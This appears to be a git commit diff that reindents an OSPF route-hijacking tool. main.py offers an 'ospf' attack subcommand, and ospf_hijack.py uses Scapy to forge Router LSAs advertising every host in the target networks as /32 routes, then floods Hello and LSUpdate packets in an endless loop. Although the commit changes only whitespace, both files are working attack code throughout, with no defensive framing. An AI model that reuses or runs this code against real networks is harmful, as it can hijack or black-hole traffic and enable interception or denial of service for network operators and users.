edd6d6aa6d8f223007612fde0fb5bd87274d4566
George <george.neokq@gmail.com>
2022-06-15 08:09:58 +0800

    style: Change tab size to 2

--- main.py
+++ main.py
@@ -2,23 +2,23 @@ import argparse
 from ospf_hijack import *
 
 def main():
-    parser = argparse.ArgumentParser()
-    subparsers = parser.add_subparsers(dest='attack')
-    subparsers.required = True
-    ospf_subparser = subparsers.add_parser('ospf')
-    ospf_subparser.add_argument('--networks',
-        nargs='+',
-        type=str,
-        action='store',
-        help="Space-separated network addresses in CIDR notation",
-        required=True)
+  parser = argparse.ArgumentParser()
+  subparsers = parser.add_subparsers(dest='attack')
+  subparsers.required = True
+  ospf_subparser = subparsers.add_parser('ospf')
+  ospf_subparser.add_argument('--networks',
+      nargs='+',
+      type=str,
+      action='store',
+      help="Space-separated network addresses in CIDR notation",
+      required=True)
 
-    args = parser.parse_args()
-    attack = args.attack
+  args = parser.parse_args()
+  attack = args.attack
 
-    if attack == 'ospf':
-        spam_hello_and_advertisements(networks=args.networks)
+  if attack == 'ospf':
+      spam_hello_and_advertisements(networks=args.networks)
     
 
 if __name__ == '__main__':
-    main()
+  main()
--- ospf_hijack.py
+++ ospf_hijack.py
@@ -10,10 +10,10 @@ from netaddr import IPNetwork
 
 # Only transit should be used in this tool. This dictionary just gives the numbers meaning
 OSPF_Router_LSA_types = {
-    "p2p": 1,
-    "transit": 2,
-    "stub": 3,
-    "virtual": 4
+  "p2p": 1,
+  "transit": 2,
+  "stub": 3,
+  "virtual": 4
 }
 
 # MY_IP = IP().src
@@ -23,59 +23,63 @@ ADVERTISE_IP = '127.0.0.1'
 
 # FOR TESTING
 TEST_NETWORKS = [
-    '192.168.1.0/24'
+  '192.168.1.0/24'
 ]
 
+
 def generate_lsa_list(networks: List[str], src_ip=MY_IP, metric=0):
-    """
-    Given a list of networks specified in CIDR notation, generate OSPF_Router_LSA packets.
-    Every host in each specified network will be advertised individually with /32 prefix.
+  """
+  Given a list of networks specified in CIDR notation, generate OSPF_Router_LSA packets.
+  Every host in each specified network will be advertised individually with /32 prefix.
 
-    Parameters
-    -----------
-    networks: List[str]
-        List of network addresses in CIDR notation
-    """
-    lsalist = []
-    for network in networks:
-        ip_range = IPNetwork(network)
-        for ip_addr in ip_range.iter_hosts():
-            lsalist.append(
-                OSPF_Router_LSA(id=src_ip, adrouter=src_ip, linklist=[
-                    OSPF_Link(id=ip_addr, data='255.255.255.255',
-                        metric=metric,
-                        type=OSPF_Router_LSA_types['transit'])
-                ])
-            )
+  Parameters
+  -----------
+  networks: List[str]
+      List of network addresses in CIDR notation
+  """
+  lsalist = []
+  for network in networks:
+      ip_range = IPNetwork(network)
+      for ip_addr in ip_range.iter_hosts():
+          lsalist.append(
+              OSPF_Router_LSA(id=src_ip, adrouter=src_ip, linklist=[
+                  OSPF_Link(id=ip_addr, data='255.255.255.255',
+                            metric=metric,
+                            type=OSPF_Router_LSA_types['transit'])
+              ])
+          )
 
-    return lsalist
+  return lsalist
 
 
 def spam_hello_and_advertisements(*, networks: List[str], interval=0.5):
-    """
-    Given a list of network addresses specified in CIDR notation,
-    flood those networks with OSPF Hello packets and LSA updates.
+  """
+  Given a list of network addresses specified in CIDR notation,
+  flood those networks with OSPF Hello packets and LSA updates.
 
-    Parameters
-    -----------
-    networks: List[str]
-        List of network addresses in CIDR notation
+  Parameters
+  -----------
+  networks: List[str]
+      List of network addresses in CIDR notation
 
-    interval: number
-        Interval in seconds to spam packets
-    """
+  interval: number
+      Interval in seconds to spam packets
+  """
 
-    lsalist = generate_lsa_list(networks)
+  lsalist = generate_lsa_list(networks)
 
-    print('Spamming hello and LSUpdate packets.')
-    while True:
-        hello_packet = IP(dst=ADVERTISE_IP) / OSPF_Hdr(src=MY_IP) / OSPF_Hello()
-        send(hello_packet, verbose=False)
+  print('Spamming hello and LSUpdate packets.')
+  while True:
+      hello_packet = IP(dst=ADVERTISE_IP) / \
+          OSPF_Hdr(src=MY_IP) / OSPF_Hello()
+      send(hello_packet, verbose=False)
 
-        update_packet = IP(dst=ADVERTISE_IP) / OSPF_Hdr(src=MY_IP) / OSPF_LSUpd(lsalist=lsalist)
-        send(update_packet, verbose=False)
+      update_packet = IP(dst=ADVERTISE_IP) / \
+          OSPF_Hdr(src=MY_IP) / OSPF_LSUpd(lsalist=lsalist)
+      send(update_packet, verbose=False)
 
-        sleep(interval)
+      sleep(interval)
+
 
 if __name__ == '__main__':
-    spam_hello_and_advertisements(networks=TEST_NETWORKS)
+  spam_hello_and_advertisements(networks=TEST_NETWORKS)
